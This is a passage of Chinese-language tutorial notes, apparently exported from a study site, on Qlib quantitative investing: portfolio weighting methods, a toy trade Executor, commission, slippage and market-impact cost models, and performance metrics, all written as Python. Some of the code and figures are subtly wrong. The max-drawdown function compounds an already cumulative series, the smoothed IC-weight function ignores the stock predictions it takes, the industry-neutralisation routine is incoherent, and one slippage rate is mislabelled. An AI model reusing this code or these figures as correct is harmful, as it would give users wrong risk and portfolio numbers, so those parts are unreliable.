变动\n\nweight_cap（最大单股权重）\n\n推荐范围：0.05-0.2\n限制单股权重，控制风险\n\n2.3 适用场景\n\n✅ 有足够历史数据\n✅ 模型预测能力差异明显\n✅ 追求超额收益\n✅ 可以承受较高换手率\n\n2.4 权重平滑处理\ndef ic_weight_smooth(predictions, ic_history, window=20, alpha=1.0):\n    &quot;&quot;&quot;\n    平滑 IC 权重（Softmax）\n    \n    参数:\n        predictions: 股票预测分数\n        ic_history: IC 历史数据\n        window: IC 计算窗口\n        alpha: Softmax 系数\n    \n    返回:\n        weights: 股票权重，权重和为1\n    &quot;&quot;&quot;\n    # 1. 计算滚动 IC\n    rolling_ic = ic_history.rolling(window=window).mean()\n    \n    # 2. Softmax 归一化\n    exp_ic = np.exp(alpha * rolling_ic)\n    weights = exp_ic / exp_ic.sum()\n    \n    return weights\n \n# 示例\nweights_smooth = ic_weight_smooth(predictions, ic_history, window=5, alpha=1.0)\nprint(&quot;平滑 IC 权重:&quot;)\nprint(weights_smooth)\n\n3. 均值-方差优化\n3.1 算法步骤\nimport cvxpy as cp\n \ndef mv_optimization(returns, risk_aversion=1.0, max_weight=0.1, min_weight=0.0):\n    &quot;&quot;&quot;\n    均值-方差优化\n    \n    参数:\n        returns: 历史收益率\n        risk_aversion: 风险厌恶系数\n        max_weight: 最大单股权重\n        min_weight: 最小单股权重\n    \n    返回:\n        weights: 最优权重\n    &quot;&quot;&quot;\n    n = len(returns.columns)\n    \n    # 1. 估计期望收益\n    mu = returns.mean().values\n    \n    # 2. 估计协方差矩阵\n    sigma = returns.cov().values\n    \n    # 3. 正则化（防止过拟合）\n    sigma_reg = sigma + 1e-6 * np.eye(n)\n    \n    # 4. 定义变量\n    w = cp.Variable(n)\n    \n    # 5. 定义目标函数\n    objective = cp.Maximize(mu @ w - risk_aversion * cp.quad_form(w, sigma_reg))\n    \n    # 6. 定义约束\n    constraints = [\n        cp.sum(w) == 1,        # 权重和为1\n        w &gt;= min_weight,        # 最小权重\n        w &lt;= max_weight         # 最大权重\n    ]\n    \n    # 7. 求解\n    problem = cp.Problem(objective, constraints)\n    problem.solve()\n    \n    # 8. 获取解\n    optimal_weights = pd.Series(w.value, index=returns.columns)\n    \n    return optimal_weights\n \n# 示例\nimport numpy as np\n \n# 生成示例数据\nnp.random.seed(42)\nn_stocks = 10\nn_days = 252\nstocks = [f&#039;stock_{i}&#039; for i in range(n_stocks)]\ndates = pd.date_range(&#039;2020-01-01&#039;, periods=n_days, freq=&#039;D&#039;)\n \nreturns = pd.DataFrame(\n    np.random.randn(n_days, n_stocks) * 0.02,\n    index=dates,\n    columns=stocks\n)\n \n# MV 优化\nweights_mv = mv_optimization(\n    returns, \n    risk_aversion=1.0,\n    max_weight=0.2,\n    min_weight=0.0\n)\n \nprint(&quot;MV 优化权重:&quot;)\nprint(weights_mv)\n3.2 关键参数\nrisk_aversion（风险厌恶系数）\n\n推荐范围：0.1-10.0\n小值：更注重收益，风险大\n大值：更注重风险，收益可能低\n\nmax_weight（最大单股权重）\n\n推荐范围：0.05-0.2\n限制单股权重，控制风险\n\nlambda_reg（正则化系数）\n\n推荐范围：1e-6-1e-3\n正则化协方差矩阵，防止过拟合\n\nestimation_window（参数估计窗口）\n\n推荐范围：126-504（半年到两年）\n窗口越大，估计越稳定，但可能滞后\n\n3.3 适用场景\n\n✅ 追求风险调整后收益\n✅ 有良好的数据质量\n✅ 需要科学的资产配置\n✅ 理解量化投资理论\n❌ 不适合新手\n\n3.4 风险厌恶系数优化\ndef optimize_risk_aversion(returns, ra_values=[0.1, 0.5, 1.0, 2.0, 5.0, 10.0]):\n    &quot;&quot;&quot;\n    优化风险厌恶系数\n    \n    参数:\n        returns: 历史收益率\n        ra_values: 风险厌恶系数候选值\n    \n    返回:\n        results: 不同风险厌恶系数的结果\n    &quot;&quot;&quot;\n    results = []\n    \n    for ra in ra_values:\n        # 计算最优权重\n        weights = mv_optimization(returns, risk_aversion=ra, max_weight=0.2)\n        \n        # 计算组合收益和风险\n        portfolio_return = (returns * weights).sum(axis=1).mean()\n        portfolio_std = (returns * weights).sum(axis=1).std()\n        sharpe = portfolio_return / portfolio_std\n        \n        results.append({\n            &#039;risk_aversion&#039;: ra,\n            &#039;return&#039;: portfolio_return,\n            &#039;std&#039;: portfolio_std,\n            &#039;sharpe&#039;: sharpe,\n            &#039;n_stocks&#039;: (weights &gt; 0.01).sum()\n        })\n    \n    return pd.DataFrame(results)\n \n# 示例\nra_results = optimize_risk_aversion(returns)\nprint(&quot;风险厌恶系数优化:&quot;)\nprint(ra_results)\n\n4. 三种方法对比\n4.1 性能对比\ndef compare_strategies(predictions, returns, k=20, risk_aversion=1.0):\n    &quot;&quot;&quot;\n    对比三种策略\n    \n    参数:\n        predictions: 股票预测分数\n        returns: 历史收益率\n        k: Top-K 的 K 值\n        risk_aversion: 风险厌恶系数\n    \n    返回:\n        comparison: 对比结果\n    &quot;&quot;&quot;\n    # 1. Top-K 等权\n    weights_topk = top_k_equal_weight(predictions, k=k)\n    return_topk = (returns * weights_topk).sum(axis=1)\n    sharpe_topk = return_topk.mean() / return_topk.std()\n    \n    # 2. MV 优化\n    weights_mv = mv_optimization(returns, risk_aversion=risk_aversion)\n    return_mv = (returns * weights_mv).sum(axis=1)\n    sharpe_mv = return_mv.mean() / return_mv.std()\n    \n    # 3. 对比结果\n    comparison = pd.DataFrame({\n        &#039;Strategy&#039;: [&#039;Top-K&#039;, &#039;MV&#039;],\n        &#039;Mean Return&#039;: [return_topk.mean(), return_mv.mean()],\n        &#039;Std&#039;: [return_topk.std(), return_mv.std()],\n        &#039;Sharpe&#039;: [sharpe_topk, sharpe_mv],\n        &#039;N Stocks&#039;: [(weights_topk &gt; 0).sum(), (weights_mv &gt; 0.01).sum()],\n        &#039;Max Weight&#039;: [weights_topk.max(), weights_mv.max()]\n    })\n    \n    return comparison\n \n# 示例\ncomparison = compare_strategies(predictions, returns, k=3, risk_aversion=1.0)\nprint(&quot;策略对比:&quot;)\nprint(comparison)\n4.2 综合对比表\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n维度Top-K 等权IC 权重MV 优化复杂度低中高数据需求低中高理论支撑经验统计理论计算速度快中慢换手率中高中风险控制弱中强适合新手✅⚠️❌适合实战✅✅✅\n\n5. 实践建议\n5.1 策略选择\n新手建议：\n\n从 Top-K 等权开始\n使用较小的 K 值（20-30）\n定期调仓（周频或月频）\n严格风险控制\n\n进阶建议：\n\n尝试 IC 权重策略\n学习 MV 优化方法\n进行参数敏感性分析\n做样本外验证\n\n专家建议：\n\n结合多种方法\n动态调整策略\n考虑市场环境\n持续优化改进\n\n5.2 参数优化建议\n1. 避免过拟合\n\n使用样本外验证\n限制参数数量\n参数有经济学含义\n\n2. 参数稳定性\n\n在不同时间段表现稳定\n对数据变化不过敏\n定期重新评估参数\n\n3. 实践经验\n# ❌ 错误做法\n# 过度优化，参数过多\nparams = {\n    &#039;k&#039;: 23,\n    &#039;lookback&#039;: 17,\n    &#039;threshold&#039;: 0.032,\n    &#039;smoothing&#039;: 0.7,\n    # ... 太多参数\n}\n \n# ✅ 正确做法\n# 少量关键参数\nparams = {\n    &#039;k&#039;: 20,  # 清晰的含义\n    &#039;lookback&#039;: 20  # 基于经济逻辑\n}\n5.3 风险控制建议\n1. 分散化\n\n持有多只股票（至少 10 只）\n考虑行业分散\n避免过度集中\n\n2. 仓位控制\ndef position_sizing(weights, max_position=0.1):\n    &quot;&quot;&quot;\n    仓位控制\n    \n    参数:\n        weights: 原始权重\n        max_position: 最大单股权重\n    \n    返回:\n        controlled_weights: 控制后的权重\n    &quot;&quot;&quot;\n    # 限制单股权重\n    controlled_weights = weights.clip(upper=max_position)\n    \n    # 重新归一化\n    controlled_weights = controlled_weights / controlled_weights.sum()\n    \n    return controlled_weights\n3. 行业中性化\ndef industry_neutralize(weights, industry_weights, target=0.0):\n    &quot;&quot;&quot;\n    行业中性化\n    \n    参数:\n        weights: 股票权重\n        industry_weights: 行业权重\n        target: 目标行业权重\n    \n    返回:\n        neutralized_weights: 中性化后的权重\n    &quot;&quot;&quot;\n    # 计算行业偏离\n    industry_exposure = (weights * industry_weights).sum()\n    \n    # 调整权重\n    neutralized_weights = weights * (target / industry_exposure)\n    \n    return neutralized_weights\n\n总结\n三种投资组合构建方法各有优劣：\n\nTop-K 等权：简单可靠，适合新手\nIC 权重：动态调整，适合有历史数据\nMV 优化：科学配置，适合追求风险调整后收益\n\n建议：\n\n新手从 Top-K 等权开始\n进阶后尝试 IC 权重\n专家可以使用 MV 优化\n结合多种方法，取长补短\n"},"quant/qlib/week3/03-Executor与成本模型":{"slug":"quant/qlib/week3/03-Executor与成本模型","filePath":"quant/qlib/week3/03-Executor与成本模型.md","title":"03-Executor与成本模型","links":[],"tags":[],"content":"Executor 与成本模型\n1. Executor 机制\n1.1 Executor 定义\nExecutor：负责执行交易信号的组件，模拟真实交易环境\nclass Executor:\n    &quot;&quot;&quot;\n    交易执行器\n    \n    功能：\n    1. 接收交易信号\n    2. 执行交易\n    3. 计算成本\n    4. 更新持仓\n    5. 记录绩效\n    &quot;&quot;&quot;\n    \n    def __init__(self, config):\n        self.account = config[&#039;initial_account&#039;]\n        self.positions = {}\n        self.cash = self.account\n        self.trade_history = []\n        \n    def execute(self, signals, prices):\n        &quot;&quot;&quot;\n        执行交易信号\n        \n        参数:\n            signals: 交易信号\n            prices: 价格数据\n        \n        返回:\n            trades: 执行的交易\n        &quot;&quot;&quot;\n        trades = []\n        \n        for stock, target_weight in signals.items():\n            if target_weight == 0:\n                # 卖出\n                trade = self.sell(stock, prices[stock])\n            else:\n                # 买入\n                trade = self.buy(stock, target_weight, prices[stock])\n            \n            if trade:\n                trades.append(trade)\n        \n        return trades\n    \n    def buy(self, stock, target_weight, price):\n        &quot;&quot;&quot;\n        买入股票\n        \n        参数:\n            stock: 股票代码\n            target_weight: 目标权重\n            price: 价格\n        \n        返回:\n            trade: 交易记录\n        &quot;&quot;&quot;\n        # 计算目标持仓价值\n        target_value = self.account * target_weight\n        \n        # 计算需要买入的股数\n        shares = int(target_value / price)\n        \n        if shares &lt;= 0:\n            return None\n        \n        # 计算交易金额\n        trade_value = shares * price\n        \n        # 检查现金是否足够\n        if trade_value &gt; self.cash:\n            shares = int(self.cash / price)\n            trade_value = shares * price\n        \n        # 更新持仓和现金\n        if stock not in self.positions:\n            self.positions[stock] = 0\n        \n        self.positions[stock] += shares\n        self.cash -= trade_value\n        \n        # 记录交易\n        trade = {\n            &#039;stock&#039;: stock,\n            &#039;action&#039;: &#039;buy&#039;,\n            &#039;shares&#039;: shares,\n            &#039;price&#039;: price,\n            &#039;value&#039;: trade_value\n        }\n        self.trade_history.append(trade)\n        \n        return trade\n    \n    def sell(self, stock, price):\n        &quot;&quot;&quot;\n        卖出股票\n        \n        参数:\n            stock: 股票代码\n            price: 价格\n        \n        返回:\n            trade: 交易记录\n        &quot;&quot;&quot;\n        # 检查持仓\n        if stock not in self.positions or self.positions[stock] &lt;= 0:\n            return None\n        \n        # 全部卖出\n        shares = self.positions[stock]\n        trade_value = shares * price\n        \n        # 更新持仓和现金\n        self.positions[stock] = 0\n        self.cash += trade_value\n        \n        # 记录交易\n        trade = {\n            &#039;stock&#039;: stock,\n            &#039;action&#039;: &#039;sell&#039;,\n            &#039;shares&#039;: shares,\n            &#039;price&#039;: price,\n            &#039;value&#039;: trade_value\n        }\n        self.trade_history.append(trade)\n        \n        return trade\n1.2 Qlib Executor 架构\nExecutor {\n    execute(signals) → trades           # 执行交易信号\n    apply_costs(trades) → adj_returns  # 应用交易成本\n    generate_portfolio_metrics() → metrics  # 生成组合指标\n}\n1.3 Executor 功能\n1. 信号执行\n\n接收交易信号\n模拟订单提交\n计算成交价格\n\n2. 成本应用\n\n计算手续费\n计算滑点成本\n计算市场冲击\n\n3. 持仓管理\n\n更新当前持仓\n计算持仓价值\n管理现金余额\n\n4. 绩效记录\n\n记录每笔交易\n计算实时绩效\n生成绩效报告\n\n\n2. 交易成本模型\n2.1 成本构成\n1. 手续费\n\n按交易金额的固定比例收取\n买入费率和卖出费率可能不同\n通常有最低费用限制\n\n2. 滑点\n\n实际成交价格与理想价格的差异\n与交易规模和流动性相关\n通常按价格百分比计算\n\n3. 市场冲击\n\n大额交易对价格的冲击\n与交易金额和市场流动性相关\n通常按交易量的平方根计算\n\n2.2 手续费计算\n计算公式：\n手续费 = 交易金额 × 费率\n手续费 = max(手续费, 最低费用)\n\nPython 实现：\ndef calculate_commission(trade_value, commission_rate, min_commission=5):\n    &quot;&quot;&quot;\n    计算手续费\n    \n    参数:\n        trade_value: 交易金额\n        commission_rate: 手续费率\n        min_commission: 最低手续费\n    \n    返回:\n        commission: 手续费\n    &quot;&quot;&quot;\n    commission = trade_value * commission_rate\n    commission = max(commission, min_commission)\n    \n    return commission\n \n# 示例\ntrade_value = 100000  # 交易10万元\ncommission_rate = 0.0003  # 万分之三\nmin_commission = 5  # 最低5元\n \ncommission = calculate_commission(trade_value, commission_rate, min_commission)\nprint(f&quot;手续费 = {commission:.2f} 元&quot;)\n2.3 滑点计算\n计算公式：\n滑点成本 = 交易金额 × 滑点率\n成交价格 = 理想价格 × (1 ± 滑点率)\n\nPython 实现：\ndef calculate_slippage(trade_value, slippage_rate, is_buy=True):\n    &quot;&quot;&quot;\n    计算滑点成本\n    \n    参数:\n        trade_value: 交易金额\n        slippage_rate: 滑点率\n        is_buy: 是否买入\n    \n    返回:\n        slippage_cost: 滑点成本\n        execution_price: 执行价格\n    &quot;&quot;&quot;\n    # 买入时滑点增加成本，卖出时滑点减少收益\n    if is_buy:\n        slippage_cost = trade_value * slippage_rate\n        execution_price = 1 + slippage_rate\n    else:\n        slippage_cost = trade_value * slippage_rate\n        execution_price = 1 - slippage_rate\n    \n    return slippage_cost, execution_price\n \n# 示例\ntrade_value = 100000  # 交易10万元\nslippage_rate = 0.001  # 千分之一\n \n# 买入\nslippage_buy, price_buy = calculate_slippage(trade_value, slippage_rate, is_buy=True)\nprint(f&quot;买入滑点 = {slippage_buy:.2f} 元&quot;)\n \n# 卖出\nslippage_sell, price_sell = calculate_slippage(trade_value, slippage_rate, is_buy=False)\nprint(f&quot;卖出滑点 = {slippage_sell:.2f} 元&quot;)\n2.4 市场冲击计算\n计算公式：\n市场冲击 = k × sqrt(交易量 / 日均成交量)\n\nPython 实现：\ndef calculate_market_impact(trade_value, avg_daily_value, impact_factor=0.1):\n    &quot;&quot;&quot;\n    计算市场冲击\n    \n    参数:\n        trade_value: 交易金额\n        avg_daily_value: 日均交易金额\n        impact_factor: 冲击系数\n    \n    返回:\n        market_impact: 市场冲击成本\n    &quot;&quot;&quot;\n    if avg_daily_value == 0:\n        return 0\n    \n    # 计算交易比例\n    trade_ratio = trade_value / avg_daily_value\n    \n    # 计算市场冲击\n    market_impact = trade_value * impact_factor * np.sqrt(trade_ratio)\n    \n    return market_impact\n \n# 示例\ntrade_value = 1000000  # 交易100万元\navg_daily_value = 50000000  # 日均交易5000万元\n \nmarket_impact = calculate_market_impact(trade_value, avg_daily_value)\nprint(f&quot;市场冲击 = {market_impact:.2f} 元&quot;)\n2.5 总成本模型\ndef calculate_total_cost(trade_value, commission_rate, slippage_rate, \n                           min_commission=5, avg_daily_value=None, impact_factor=0.1):\n    &quot;&quot;&quot;\n    计算总成本\n    \n    参数:\n        trade_value: 交易金额\n        commission_rate: 手续费率\n        slippage_rate: 滑点率\n        min_commission: 最低手续费\n        avg_daily_value: 日均交易金额\n        impact_factor: 冲击系数\n    \n    返回:\n        total_cost: 总成本\n        cost_breakdown: 成本明细\n    &quot;&quot;&quot;\n    # 1. 手续费\n    commission = calculate_commission(trade_value, commission_rate, min_commission)\n    \n    # 2. 滑点\n    slippage = trade_value * slippage_rate\n    \n    # 3. 市场冲击\n    if avg_daily_value and impact_factor:\n        market_impact = calculate_market_impact(trade_value, avg_daily_value, impact_factor)\n    else:\n        market_impact = 0\n    \n    # 4. 总成本\n    total_cost = commission + slippage + market_impact\n    \n    # 5. 成本明细\n    cost_breakdown = {\n        &#039;commission&#039;: commission,\n        &#039;slippage&#039;: slippage,\n        &#039;market_impact&#039;: market_impact,\n        &#039;total&#039;: total_cost\n    }\n    \n    return total_cost, cost_breakdown\n \n# 示例\ntrade_value = 100000  # 交易10万元\ncommission_rate = 0.0003  # 万分之三\nslippage_rate = 0.001  # 千分之一\navg_daily_value = 5000000  # 日均交易500万元\nimpact_factor = 0.1\n \ntotal_cost, breakdown = calculate_total_cost(\n    trade_value, commission_rate, slippage_rate,\n    min_commission=5,\n    avg_daily_value=avg_daily_value,\n    impact_factor=impact_factor\n)\n \nprint(&quot;成本明细:&quot;)\nfor key, value in breakdown.items():\n    print(f&quot;  {key}: {value:.2f} 元&quot;)\nprint(f&quot;  总成本: {total_cost:.2f} 元&quot;)\nprint(f&quot;  成本率: {total_cost / trade_value:.4f}&quot;)\n\n3. 成本敏感性分析\n3.1 成本参数范围\n手续费率：\n\n低：0.0001（万分之一）\n中：0.001（千分之一）\n高：0.003（千分之三）\n\n滑点率：\n\n低：0.0005（万分之一）\n中：0.001（千分之一）\n高：0.005（千分之五）\n\n3.2 成本影响分析\n对收益率的影响：\n净值收益 = 原始收益 - 总成本\n\n对换手率的影响：\n换手成本 = 换手率 × 平均资产 × 成本率\n\n对策略选择的影响：\n\n高换手率策略对成本更敏感\n低成本环境适合高频策略\n高成本环境适合低换手率策略\n\n3.3 成本敏感性分析\ndef cost_sensitivity_analysis(trade_value, commission_rates, slippage_rates):\n    &quot;&quot;&quot;\n    成本敏感性分析\n    \n    参数:\n        trade_value: 交易金额\n        commission_rates: 手续费率列表\n        slippage_rates: 滑点率列表\n    \n    返回:\n        sensitivity: 敏感性分析结果\n    &quot;&quot;&quot;\n    sensitivity = []\n    \n    for comm_rate in commission_rates:\n        for slip_rate in slippage_rates:\n            total_cost, _ = calculate_total_cost(\n                trade_value, comm_rate, slip_rate\n            )\n            \n            sensitivity.append({\n                &#039;commission_rate&#039;: comm_rate,\n                &#039;slippage_rate&#039;: slip_rate,\n                &#039;total_cost&#039;: total_cost,\n                &#039;cost_rate&#039;: total_cost / trade_value\n            })\n    \n    return pd.DataFrame(sensitivity)\n \n# 示例\ncommission_rates = [0.0001, 0.0003, 0.001, 0.003]\nslippage_rates = [0.0005, 0.001, 0.002, 0.005]\n \nsensitivity_df = cost_sensitivity_analysis(100000, commission_rates, slippage_rates)\n \nprint(&quot;成本敏感性分析:&quot;)\nprint(sensitivity_df)\n3.4 换手率与成本的关系\ndef turnover_cost_analysis(avg_value, turnover_rates, cost_rate=0.003):\n    &quot;&quot;&quot;\n    换手率与成本关系分析\n    \n    参数:\n        avg_value: 平均资产\n        turnover_rates: 换手率列表\n        cost_rate: 成本率\n    \n    返回:\n        analysis: 分析结果\n    &quot;&quot;&quot;\n    analysis = []\n    \n    for turnover in turnover_rates:\n        # 年化换手成本\n        annual_cost = avg_value * turnover * cost_rate\n        \n        analysis.append({\n            &#039;turnover&#039;: turnover,\n            &#039;annual_cost&#039;: annual_cost,\n            &#039;cost_ratio&#039;: annual_cost / avg_value\n        })\n    \n    return pd.DataFrame(analysis)\n \n# 示例\navg_value = 1000000  # 平均资产100万\nturnover_rates = [0.5, 1.0, 2.0, 3.0, 5.0, 10.0]  # 换手率\n \ncost_df = turnover_cost_analysis(avg_value, turnover_rates, cost_rate=0.003)\n \nprint(&quot;换手率与成本关系:&quot;)\nprint(cost_df)\n\n4. 实践建议\n4.1 成本控制策略\n1. 降低换手率\n\n优化调仓频率\n增加持仓周期\n使用止损止盈\n\n2. 降低交易成本\n\n选择低佣金券商\n优化下单时间\n分批建仓\n\n3. 选择流动性好的股票\n\n避免小市值股票\n关注日均成交量\n避免停牌股票\n\n4.2 成本参数配置\nQlib 配置示例：\nexecutor_config = {\n    &#039;class&#039;: &#039;SimulatorExecutor&#039;,\n    &#039;module_path&#039;: &#039;qlib.backtest.executor&#039;,\n    &#039;kwargs&#039;: {\n        &#039;time_per_step&#039;: &#039;day&#039;,\n        &#039;generate_portfolio_metrics&#039;: True\n    }\n}\n \nexchange_config = {\n    &#039;freq&#039;: &#039;day&#039;,\n    &#039;limit_threshold&#039;: 0.095,\n    &#039;deal_price&#039;: &#039;close&#039;,\n    &#039;open_cost&#039;: 0.0005,   # 买入费率万分之五\n    &#039;close_cost&#039;: 0.0015,  # 卖出费率千分之1.5\n    &#039;min_cost&#039;: 5           # 最低手续费5元\n}\n4.3 成本敏感性测试\n测试流程：\n\n使用低成本参数回测\n逐步增加成本参数\n观察策略表现变化\n确定策略的成本敏感性\n\nPython 实现：\ndef test_cost_sensitivity(strategy, returns, base_config, \n                         cost_multipliers=[1.0, 1.5, 2.0, 3.0]):\n    &quot;&quot;&quot;\n    成本敏感性测试\n    \n    参数:\n        strategy: 交易策略\n        returns: 收益率数据\n        base_config: 基础配置\n        cost_multipliers: 成本倍数列表\n    \n    返回:\n        results: 测试结果\n    &quot;&quot;&quot;\n    results = []\n    \n    for multiplier in cost_multipliers:\n        # 调整成本参数\n        config = base_config.copy()\n        config[&#039;open_cost&#039;] *= multiplier\n        config[&#039;close_cost&#039;] *= multiplier\n        \n        # 回测\n        performance = backtest(strategy, returns, config)\n        \n        results.append({\n            &#039;cost_multiplier&#039;: multiplier,\n            &#039;return&#039;: performance[&#039;return&#039;],\n            &#039;sharpe&#039;: performance[&#039;sharpe&#039;],\n            &#039;max_drawdown&#039;: performance[&#039;max_drawdown&#039;]\n        })\n    \n    return pd.DataFrame(results)\n \n# 示例\nbase_config = {\n    &#039;open_cost&#039;: 0.0005,\n    &#039;close_cost&#039;: 0.0015,\n    &#039;min_cost&#039;: 5\n}\n \nresults = test_cost_sensitivity(strategy, returns, base_config)\nprint(&quot;成本敏感性测试:&quot;)\nprint(results)\n\n总结\n交易成本是量化投资中不可忽视的因素：\n\n成本构成：手续费、滑点、市场冲击\n成本计算：建立准确的成本模型\n成本敏感性：分析成本对策略的影响\n成本控制：优化策略降低成本\n\n建议：\n\n务必做成本敏感性分析\n选择合理的成本参数\n优化策略降低换手率\n选择流动性好的股票\n"},"quant/qlib/week3/04-绩效评估指标":{"slug":"quant/qlib/week3/04-绩效评估指标","filePath":"quant/qlib/week3/04-绩效评估指标.md","title":"04-绩效评估指标","links":[],"tags":[],"content":"绩效评估指标\n1. 收益率指标\n1.1 总收益率\ndef calculate_total_return(cumulative_returns):\n    &quot;&quot;&quot;\n    计算总收益率\n    \n    参数:\n        cumulative_returns: 累计收益率\n    \n    返回:\n        total_return: 总收益率\n    &quot;&quot;&quot;\n    total_return = cumulative_returns.iloc[-1]\n    return total_return\n1.2 年化收益率\ndef calculate_annual_return(returns, periods_per_year=252):\n    &quot;&quot;&quot;\n    计算年化收益率\n    \n    参数:\n        returns: 日收益率序列\n        periods_per_year: 每年交易天数\n    \n    返回:\n        annual_return: 年化收益率\n    &quot;&quot;&quot;\n    cumulative_return = (1 + returns).prod() - 1\n    n_periods = len(returns)\n    \n    annual_return = (1 + cumulative_return) ** (periods_per_year / n_periods) - 1\n    \n    return annual_return\n1.3 超额收益率\ndef calculate_excess_return(strategy_return, benchmark_return):\n    &quot;&quot;&quot;\n    计算超额收益率\n    \n    参数:\n        strategy_return: 策略收益率\n        benchmark_return: 基准收益率\n    \n    返回:\n        excess_return: 超额收益率\n    &quot;&quot;&quot;\n    excess_return = strategy_return - benchmark_return\n    return excess_return\n2. 风险指标\n2.1 波动率\ndef calculate_volatility(returns, periods_per_year=252):\n    &quot;&quot;&quot;\n    计算波动率\n    \n    参数:\n        returns: 日收益率序列\n        periods_per_year: 每年交易天数\n    \n    返回:\n        volatility: 年化波动率\n    &quot;&quot;&quot;\n    daily_vol = returns.std()\n    annual_vol = daily_vol * np.sqrt(periods_per_year)\n    \n    return annual_vol\n2.2 最大回撤\ndef calculate_max_drawdown(cumulative_returns):\n    &quot;&quot;&quot;\n    计算最大回撤\n    \n    参数:\n        cumulative_returns: 累计收益率\n    \n    返回:\n        max_drawdown: 最大回撤\n        drawdown_series: 回撤序列\n    &quot;&quot;&quot;\n    # 计算累计净值\n    cumulative_value = (1 + cumulative_returns).cumprod()\n    \n    # 计算历史最高点\n    running_max = cumulative_value.expanding().max()\n    \n    # 计算回撤\n    drawdown = (cumulative_value - running_max) / running_max\n    \n    # 最大回撤\n    max_drawdown = drawdown.min()\n    \n    return max_drawdown, drawdown\n2.3 VaR (在险价值)\ndef calculate_var(returns, confidence_level=0.95):\n    &quot;&quot;&quot;\n    计算VaR (在险价值）\n    \n    参数:\n        returns: 收益率序列\n        confidence_level: 置信水平\n    \n    返回:\n        var: VaR值\n    &quot;&quot;&quot;\n    var = np.percentile(returns, (1 - confidence_level) * 100)\n    return var\n3. 风险调整收益指标\n3.1 夏普比率\ndef calculate_sharpe_ratio(returns, risk_free_rate=0.03, periods_per_year=252):\n    &quot;&quot;&quot;\n    计算夏普比率\n    \n    参数:\n        returns: 日收益率序列\n        risk_free_rate: 无风险利率\n        periods_per_year: 每年交易天数\n    \n    返回:\n        sharpe_ratio: 夏普比率\n    &quot;&quot;&quot;\n    annual_return = calculate_annual_return(returns, periods_per_year)\n    annual_vol = calculate_volatility(returns, periods_per_year)\n    \n    sharpe_ratio = (annual_return - risk_free_rate) / annual_vol\n    \n    return sharpe_ratio\n3.2 信息比率\ndef calculate_information_ratio(strategy_returns, benchmark_returns, periods_per_year=252):\n    &quot;&quot;&quot;\n    计算信息比率\n    \n    参数:\n        strategy_returns: 策略收益率\n        benchmark_returns: 基准收益率\n        periods_per_year: 每年交易天数\n    \n    返回:\n        information_ratio: 信息比率\n    &quot;&quot;&quot;\n    excess_returns = strategy_returns - benchmark_returns\n    \n    annual_excess_return = calculate_annual_return(excess_returns, periods_per_year)\n    tracking_error = calculate_volatility(excess_returns, periods_per_year)\n    \n    information_ratio = annual_excess_return / tracking_error\n    \n    return information_ratio\n3.3 卡尔马比率\ndef calculate_calmar_ratio(returns, periods_per_year=252):\n    &quot;&quot;&quot;\n    计算卡尔马比率\n    \n    参数:\n        returns: 日收益率序列\n        periods_per_year: 每年交易天数\n    \n    返回:\n        calmar_ratio: 卡尔马比率\n    &quot;&quot;&quot;\n    cumulative_returns = returns.cumsum()\n    annual_return = calculate_annual_return(returns, periods_per_year)\n    max_drawdown, _ = calculate_max_drawdown(cumulative_returns)\n    \n    calmar_ratio = annual_return / abs(max_drawdown)\n    \n    return calmar_ratio\n4. 交易相关指标\n4.1 换手率\ndef calculate_turnover(portfolio_changes, avg_value):\n    &quot;&quot;&quot;\n    计算换手率\n    \n    参数:\n        portfolio_changes: 持仓变化（绝对值）\n        avg_value: 平均资产价值\n    \n    返回:\n        turnover: 换手率\n    &quot;&quot;&quot;\n    turnover = portfolio_changes.abs().sum() / avg_value\n    return turnover\n4.2 胜率\ndef calculate_win_rate(trades):\n    &quot;&quot;&quot;\n    计算胜率\n    \n    参数:\n        trades: 交易记录 (DataFrame with &#039;pnl&#039; column)\n    \n    返回:\n        win_rate: 胜率\n    &quot;&quot;&quot;\n    winning_trades = len(trades[trades[&#039;pnl&#039;] &gt; 0])\n    total_trades = len(trades)\n    \n    win_rate = winning_trades / total_trades if total_trades &gt; 0 else 0\n    \n    return win_rate\n4.3 盈亏比\ndef calculate_profit_loss_ratio(trades):\n    &quot;&quot;&quot;\n    计算盈亏比\n    \n    参数:\n        trades: 交易记录 (DataFrame with &#039;pnl&#039; column)\n    \n    返回:\n        profit_loss_ratio: 盈亏比\n    &quot;&quot;&quot;\n    winning_trades = trades[trades[&#039;pnl&#039;] &gt; 0][&#039;pnl&#039;]\n    losing_trades = trades[trades[&#039;pnl&#039;] &lt; 0][&#039;pnl&#039;]\n    \n    if len(losing_trades) == 0:\n        return float(&#039;inf&#039;)\n    \n    avg_profit = winning_trades.mean()\n    avg_loss = abs(losing_trades.mean())\n    \n    profit_loss_ratio = avg_profit / avg_loss\n    \n    return profit_loss_ratio\n5. 综合评估\ndef evaluate_portfolio(returns, benchmark_returns=None, risk_free_rate=0.03):\n    &quot;&quot;&quot;\n    综合评估投资组合\n    \n    参数:\n        returns: 策略收益率\n        benchmark_returns: 基准收益率\n        risk_free_rate: 无风险利率\n    \n    返回:\n        metrics: 评估指标字典\n    &quot;&quot;&quot;\n    cumulative_returns = returns.cumsum()\n    \n    metrics = {}\n    \n    # 收益率指标\n    metrics[&#039;total_return&#039;] = calculate_total_return(cumulative_returns)\n    metrics[&#039;annual_return&#039;] = calculate_annual_return(returns)\n    \n    if benchmark_returns is not None:\n        metrics[&#039;excess_return&#039;] = calculate_excess_return(\n            metrics[&#039;annual_return&#039;],\n            calculate_annual_return(benchmark_returns)\n        )\n    \n    # 风险指标\n    metrics[&#039;volatility&#039;] = calculate_volatility(returns)\n    metrics[&#039;max_drawdown&#039;], _ = calculate_max_drawdown(cumulative_returns)\n    metrics[&#039;var_95&#039;] = calculate_var(returns, 0.95)\n    \n    # 风险调整收益指标\n    metrics[&#039;sharpe_ratio&#039;] = calculate_sharpe_ratio(returns, risk_free_rate)\n    \n    if benchmark_returns is not None:\n        metrics[&#039;information_ratio&#039;] = calculate_information_ratio(\n            returns, benchmark_returns\n        )\n    \n    metrics[&#039;calmar_ratio&#039;] = calculate_calmar_ratio(returns)\n    \n    return metrics\n \n# 示例\nimport numpy as np\nimport pandas as pd\n \nnp.random.seed(42)\nreturns = pd.Series(np.random.randn(252) * 0.02)\n \nmetrics = evaluate_portfolio(returns)\n \nprint(&quot;投资组合评估指标:&quot;)\nfor key, value in metrics.items():\n    